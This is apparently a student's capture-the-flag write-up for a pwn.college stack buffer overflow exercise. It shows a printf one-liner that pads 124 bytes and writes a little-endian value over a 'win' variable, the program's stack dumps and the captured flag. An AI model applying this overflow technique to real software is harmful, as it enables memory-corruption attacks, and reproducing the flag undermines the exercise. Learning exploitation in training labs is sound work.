# Binary Exploitation

## Variable Control (easy)
So far, your buffer overflows have simply set variables to non-zero values. Of course, memory errors often enable significantly more advanced controls over a program's state. In this challenge, you must overflow the buffer precisely to set a win condition variable to a specific value. Some things to keep in mind:

You will need to write binary data. This can't be printed on the keyboard; we recommend that you use something like Python to produce these bytes.
Keep endianness in mind!
Depending on how you generate the input data, you might accidentally terminate it with a newline! For example, bash's echo will newline-terminate by default (this behavior can be disabled using the -n flag). These newlines can cause problems --- if you are relying on precise control of program variables (which you are, in this module), an errant newline can unexpectedly corrupt program state and break your exploit. If you have doubts about whether your input has an errant newline, save it to a file and look at it using a hex dumper such as hd.

### Solve
**Flag:** `pwn.college{AHhGgVZpeJbLoXB0SFmDzIKKy1w.QX3UzMzwCM4EzNzEzW}`

The file "binary-exploitation-var-control-w" was in the challenge directory, so we used cd command to go there. Then, "./binary-exploitation-var-control-w" was executed, which gave the description and instructions of the challenge. It was given that the "win" variable is 124 bytes after the start of the input buffer and it should be set to 0x11c966e1 value. It was also required that we do not overwrite the "lose" variable which is 128 bytes after the start of the input buffer. To overwrite the win variable, we need to convert 0x11c966e1 into its little endian value. The system uses Little Endian, because the least significant byte of the data is stored at the lowest memory address. The little endian byte sequence is "\xE1\x66\xC9\x11". Since, the input buffer should not overwrite the lose variable the input buffer should be 128 bytes (124 bytes padding+ 4 bytes win variable). I tried typing this: "\xE1\x66\xC9\x11" to the input buffer directly but this counts each character differently which makes it account for more than 4 bytes. Using online resources to write a python code for this, which can also be written in one line in the bash "( printf 'A%.0s' {1..124};printf '\xE1\x66\xC9\x11' ) | ./binary-exploitation-var-control-w"." This prints the first 124 bytes as A and then the next four bytes are the win variable and this output is directly piped into the file which gave the output as the flag.

```bash
cd /challenge
hacker@binary-exploitation~variable-control-easy:/challenge$ ( printf 'A%.0s' {1..124}; printf '\xE1\x66\xC9\x11' ) | ./binary-exploitation-var-control-w
The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffffbea81c0 (rsp+0x0000) | a0 e6 1b 00 00 00 00 00 | 0x00000000001be6a0 |
| 0x00007ffffbea81c8 (rsp+0x0008) | c8 93 ea fb ff 7f 00 00 | 0x00007ffffbea93c8 |
| 0x00007ffffbea81d0 (rsp+0x0010) | b8 93 ea fb ff 7f 00 00 | 0x00007ffffbea93b8 |
| 0x00007ffffbea81d8 (rsp+0x0018) | 1c 00 00 00 01 00 00 00 | 0x000000010000001c |
| 0x00007ffffbea81e0 (rsp+0x0020) | 1c 00 00 00 00 00 00 00 | 0x000000000000001c |
| 0x00007ffffbea81e8 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffffbea81f0 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffffbea81f8 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffffbea8200 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffffbea8208 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffffbea8210 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffffbea8218 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffffbea8220 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffffbea8228 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffffbea8230 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffffbea8238 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffffbea8240 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffffbea8248 (rsp+0x0088) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffffbea8250 (rsp+0x0090) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffffbea8258 (rsp+0x0098) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffffbea8260 (rsp+0x00a0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffffbea8268 (rsp+0x00a8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffffbea8270 (rsp+0x00b0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffffbea8278 (rsp+0x00b8) | 00 f3 e2 65 ba eb ea 6d | 0x6deaebba65e2f300 |
| 0x00007ffffbea8280 (rsp+0x00c0) | c0 92 ea fb ff 7f 00 00 | 0x00007ffffbea92c0 |
| 0x00007ffffbea8288 (rsp+0x00c8) | 78 28 40 00 00 00 00 00 | 0x0000000000402878 |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7ffffbea81c0, and our base pointer points to 0x7ffffbea8280.
This means that we have (decimal) 26 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 208 bytes.
The input buffer begins at 0x7ffffbea81f0, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 121 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is a "win" variable.
By default, the value of this variable is zero.
However, if you can set variable to 0x11c966e1, the flag will be printed.
You can change this variable by overflowing the input buffer, but keep endianness in mind!
The "win" variable is stored at 0x7ffffbea826c, 124 bytes after the start of your input buffer.

 But be careful! There is also a LOSE variable. If this variable ends up non-zero, the program will terminate and you
will not get the flag. Be careful not to overwrite this variable.

The "lose" variable is stored at 0x7ffffbea8270, 128 bytes after the start of your input buffer.

We have disabled the following standard memory corruption mitigations for this challenge:
- the binary is *not* position independent. This means that it will be
located at the same spot every time it is run, which means that by
analyzing the binary (using objdump or reading this output), you can
know the exact value that you need to overwrite the return address with.

You have chosen to send 4096 bytes of input!
This will allow you to write from 0x7ffffbea81f0 (the start of the input buffer)
right up to (but not including) 0x7ffffbea91f0 (which is 3975 bytes beyond the end of the buffer).
Send your payload (up to 4096 bytes)!
You sent 128 bytes!
Let's see what happened with the stack:

+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffffbea81c0 (rsp+0x0000) | a0 e6 1b 00 00 00 00 00 | 0x00000000001be6a0 |
| 0x00007ffffbea81c8 (rsp+0x0008) | c8 93 ea fb ff 7f 00 00 | 0x00007ffffbea93c8 |
| 0x00007ffffbea81d0 (rsp+0x0010) | b8 93 ea fb ff 7f 00 00 | 0x00007ffffbea93b8 |
| 0x00007ffffbea81d8 (rsp+0x0018) | 1c 00 00 00 01 00 00 00 | 0x000000010000001c |
| 0x00007ffffbea81e0 (rsp+0x0020) | 1c 00 00 00 80 00 00 00 | 0x000000800000001c |
| 0x00007ffffbea81e8 (rsp+0x0028) | 00 10 00 00 00 00 00 00 | 0x0000000000001000 |
| 0x00007ffffbea81f0 (rsp+0x0030) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffffbea81f8 (rsp+0x0038) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffffbea8200 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffffbea8208 (rsp+0x0048) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffffbea8210 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffffbea8218 (rsp+0x0058) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffffbea8220 (rsp+0x0060) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffffbea8228 (rsp+0x0068) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffffbea8230 (rsp+0x0070) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffffbea8238 (rsp+0x0078) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffffbea8240 (rsp+0x0080) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffffbea8248 (rsp+0x0088) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffffbea8250 (rsp+0x0090) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffffbea8258 (rsp+0x0098) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffffbea8260 (rsp+0x00a0) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffffbea8268 (rsp+0x00a8) | 41 41 41 41 e1 66 c9 11 | 0x11c966e141414141 |
| 0x00007ffffbea8270 (rsp+0x00b0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffffbea8278 (rsp+0x00b8) | 00 f3 e2 65 ba eb ea 6d | 0x6deaebba65e2f300 |
| 0x00007ffffbea8280 (rsp+0x00c0) | c0 92 ea fb ff 7f 00 00 | 0x00007ffffbea92c0 |
| 0x00007ffffbea8288 (rsp+0x00c8) | 78 28 40 00 00 00 00 00 | 0x0000000000402878 |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x7ffffbea81f0
- the saved frame pointer (of main) is at 0x7ffffbea8280
- the saved return address (previously to main) is at 0x7ffffbea8288
- the saved return address is now pointing to 0x402878.
- the canary is stored at 0x7ffffbea8278.
- the canary value is now 0x6deaebba65e2f300.
- the address of the win variable is 0x7ffffbea826c.
- the value of the win variable is 0x11c966e1.
- the address of the lose variable is 0x7ffffbea8270.
- the value of the lose variable is 0x0.

You win! Here is your flag:
pwn.college{AHhGgVZpeJbLoXB0SFmDzIKKy1w.QX3UzMzwCM4EzNzEzW}

Goodbye!
```

### New Learnings
-> Overwriting variables in stack buffer overflow

### References 
https://www.youtube.com/watch?v=CounrFEsOeA
https://www.youtube.com/watch?v=T03idxny9jE
https://www.youtube.com/watch?v=5-ZQubBWz3c